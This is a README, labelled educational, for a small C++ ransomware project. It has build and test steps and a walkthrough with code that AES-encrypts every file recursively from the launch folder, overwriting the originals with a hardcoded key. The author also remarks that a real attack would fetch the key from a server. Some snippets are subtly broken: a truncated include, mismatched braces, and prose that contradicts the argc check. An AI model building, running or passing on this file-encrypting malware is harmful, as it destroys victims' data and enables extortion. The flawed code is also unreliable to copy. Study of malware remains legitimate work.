## About
- **INTENDED FOR EDUCATIONAL PURPOSES ONLY.**
- This ransomware is a very simple program that encrypts instead of a whole drive only recursively files from the folder it was
started from.
- It is very heavy on processor and even if I managed to lower RAM usage it's still not perfect.

## Requirements
- `crypto++` C++ library for `ransomware.cpp`.
- `wget`, `dd` and `yes` for `maketest.sh`.
- `gcc` for build.

## Build
1. `git clone https://github.com/ErnestNoga/ransomware`
2. `cd ransomware`
3. `mkdir build`
4. `cd build`
5. `cmake ..`
6. `make`  
After all these steps are completed you should have file called `ransomware` in current folder, it is an executable
that will encrypt all files recursively from the folder it was launched from.

## Testing
If you wish to see how the ransomware works in practice then this part is for you.  
1. `cd` into the cloned repository folder after it was [built](https://github.com/ErnestNoga/ransomware#user-content-build).
2. `./maketest.sh` and wait. This will take a long time.
3. `cd test`
4. Now go through all files and see their unencrypted values. **TIP:** use `cat ./<FILE_NAME>` when reading files in `weird_names` directory.
When checking `a_lot_of_dirs` use `for` loop to enter directories inside.
example in bash: `for i in {1..100..1}; do cd $i; done`. When exiting the directory use the same for loop but change `$i`
to `..`.
5. Now enter once again the main test directory
6. `../build/ransomware`and wait again this too will take a long time depending on the processing power of your PC.
7. Now inspect the files again to see their encrypted versions.
8. Go back to main test directory.
9. `../build/ransomware 1` and wait for files to decrypt. `1` can be replaced by any other argument only thing that matters
is that total argument number won't be less than 2.
10. Check files once again and see their decrypted values. It should be the same.

## Walkthrough
This part of README.md will be focused on explaining how ransomware works

> ### Imports
>>These are imports of this program, all the ones beginning with `cryptopp` belong to `crypto++` library which is used for encryption itself.
>> You can remove some of those imports without breaking the code because they are already imported by some header files included before, 
>> but I felt I should leave them there anyway for clarity's sake.
>>```c++
>> #include <cryptopp/aes.h>
>> #include <cryptopp/files.h>
>> #include <cryptopp/modes.h>
>> #include <cryptopp/channels.>
>>
>> #include <experimental/filesystem>
>> #include <string>
>>```  

> ### Custom namespaces
>> This line of code shortens `std::experimental::filesystem` namespace to `fs`.
>> ```c++
>> namespace fs = std::experimental::filesystem;
>> ```

> ### Encrypt function
>>This `void encrypt` function is defined as `void` since it does not return anything,
it requires two arguments: `filename` which is path of the file to encrypt and reference to `pwd` which is passphrase used to encrypt the file.
>> ```c++
>> void encrypt(const char filename[], const std::string &pwd)
>> ```
>>
>> Next line of `encrypt` function prints information about current file that is being encrypted 
>> ```c++
>> std::cout << "Encrypting: " << filename << std::endl;
>> ```
>>
>> Then we define `temp_filename` variable which will be the name of temporary file that `encrypt` function will be writing encrypted data to.
>> ```c++
>> const char temp_filename[] = "temp";
>> ```
>>
>> After that we create `iv` array of `CryptoPP::byte` which will be our initialization vector with size of 16 and set all of its indexes to `0x01` byte
>> ```c++
>> CryptoPP::byte iv[16];
>> memset(iv, 0x01, 16);
>> ```
>>
>> Next we define our `encryptor` object which requires three arguments: array of CryptoPP::byte as passphrase, passphrase
>> length and initialization vector. We specify AES CBC mode.
>> ```c++
>> CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryptor((CryptoPP::byte*)&pwd[0], pwd.size(), iv);
>> ```
>>
>> Next we create `filter` object which requires three arguments: stream transformer which will be used to transform data
>> put into it
>> and unnamed `CryptoPP::FileSink` object which is basically the destination file. After that we create `channel_switch` object
>> used for optimization, and we add to it default route through `filter`
>> ```c++
>> CryptoPP::StreamTransformationFilter filter(encryptor, new CryptoPP::FileSink(temp_filename));
>> CryptoPP::ChannelSwitch channel_switch;
>> channel_switch.AddDefaultRoute(filter);
>> ```
>>
>> Then we create two `CryptoPP::FileSource` objects: first one pumps all our data through filter, second one will move encrypted
>> data to original file. Both of these objects require three arguments: source file, whether to read and process all data, and
>> `CryptoPP::BufferedTransformation` object such as filter or sink. I could have also just renamed the temporary file, 
>> but that would cause the original file to lose all permissions it previously had.
>> ```c++
>> CryptoPP::FileSource(filename, true, new CryptoPP::Redirector(channel_switch));
>> CryptoPP::FileSource(temp_filename, true, new CryptoPP::FileSink(filename));
>> ```
>>
>> After that remove our temporary file.
>> ```c++
>> fs::remove(temp_filename);
>> ```

> ### Decrypt function
>> `decrypt` function is basically the same as `encrypt` just that the `CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption` is changed to
>> `CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption` and some variable names, so I'm not going to waste both of our time explaining it.

> ### Main function
>> This is standard definition of main function in both c and c++, `int argc` is argument count, and `char **argv` is
>> array of arguments.
>> ```c++
>> int main(int argc, char **argv)
>> ```
>>
>> This is creation of pwd string variable it is created with const keyword because it will not be changed. During
> real attack we would download passphrase from web server or use some other way to make it unreadable from compiled file.
>> ```c++
>> const std::string pwd = "12345678901234567890123456789012";
>> ```
>> 
>> `if` statement checks if argument count is 1, because if it is then we can be sure that only executable path was given.
>> If `argc == 1` then it starts for loop iterating through contents of current directory recursively, and if the path
>> of current iteration isn't a directory then it encrypts it. In the case where `argc != 0` then it instead decrypts
> the files.
>> ```c++
>> if (argc == 1) {
>>    for (const fs::directory_entry &i : fs::recursive_directory_iterator("."))
>>       if (!fs::is_directory(i.path()))
>>          encrypt(i.path().string().c_str(), pwd);
>>       } else {
>>    for (const fs::directory_entry &i : fs::recursive_directory_iterator("."))
>>       if (!fs::is_directory(i.path()))
>>          decrypt(i.path().string().c_str(), pwd);
>>    }
>> }
>> ```